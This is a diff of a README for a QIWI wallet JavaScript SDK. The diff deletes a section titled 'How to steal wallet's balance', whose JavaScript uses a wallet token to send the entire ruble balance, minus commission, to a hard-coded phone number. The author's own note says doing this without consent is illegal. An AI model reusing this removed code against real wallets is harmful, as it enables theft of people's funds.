@@ -28,7 +28,6 @@ This document is primarily on Russian, because QIWI Bank (JSC) is Russian bank a
   - [✏️ Примеры / Examples](#️-примеры--examples)
     - [🌐 Перевод через **СБП** **`[NEW]`**](#-перевод-через-сбп-new)
     - [🔎 Получение информации о владельце кошелька](#-получение-информации-о-владельце-кошелька)
-    - [💰 Как слить баланс кошелька](#-как-слить-баланс-кошелька)
     - [🔑 Создание пары ключей для взаимодействия с P2P](#-создание-пары-ключей-для-взаимодействия-с-p2p)
     - [🧱 Получение Лимитов (на TypeScript)](#-получение-лимитов-на-typescript)
     - [Интересует приём и отправка P2P платежей по РФ на NodeJS?](#интересует-приём-и-отправка-p2p-платежей-по-рф-на-nodejs)
@@ -75,48 +74,6 @@ const qp = new QIWI.Personal(process.env.QIWI_TOKEN);
 qp.getPersonProfile().then(console.log);
 
 // => { contractInfo: {...}, authInfo: {...}, userInfo: {...} }
-```
-
-### 💰 Как слить баланс кошелька
-
-**🇬🇧: `How to steal wallet's balance`**
-
-**⚠️ Если вы делаете это другим людям без их согласия - это противозаконно, я оставляю это тут, потому что это хороший пример комплексного использования API**
-
-**🇬🇧: `If you do this to other people without their consent, it is illegal, I leave it here because it is a good example of complex API use.`**
-
-```javascript
-const QIWI = require("qiwi-sdk");
-
-const qp = new QIWI.Personal(process.env.QIWI_TOKEN);
-const receiver = "+79123456789";
-const provider = 99;
-
-async function main() {
-  const profile = await qp.getPersonProfile();
-  const wallet = profile.authInfo.personId.toString();
-  const accounts = await qp.getAccounts(wallet);
-
-  const rubleAccount = accounts.find(
-    (accumulator) =>
-      accumulator.balance &&
-      accumulator.balance.currency === Personal.Currency.RUB
-  );
-
-  const commission = await qp.getCommission(
-    provider,
-    receiver,
-    rubleAccount.balance.amount
-  );
-
-  const totalToSteal = rubleAccount.balance.amount - commission;
-
-  const payment = await qp.pay(provider, receiver, totalToSteal);
-
-  console.log(payment);
-}
-
-main();
 ```
 
 ### 🔑 Создание пары ключей для взаимодействия с P2P
